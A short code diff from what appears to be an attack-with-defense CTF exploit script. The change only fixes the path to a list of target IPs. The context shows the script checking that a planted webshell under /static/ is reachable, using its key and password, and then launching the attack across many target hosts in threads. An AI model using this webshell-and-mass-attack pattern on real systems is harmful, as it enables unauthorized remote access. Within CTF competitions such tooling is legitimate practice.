@@ -18,5 +18,5 @@ class Exp(AwdTask):
         webshell_url = f"http://{ip}:{self.port}/static/" + basename(webshell.location)
         Example.update_and_test_available(ip=ip,url=webshell_url,key=webshell.key,passwd=webshell.passwd)
 
-attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt",Exp,port=80,thread_num=5)
+attacker = Attack(f"{dirname(__file__)}/../../ip.txt",Exp,port=80,thread_num=5)
 attacker.attack()
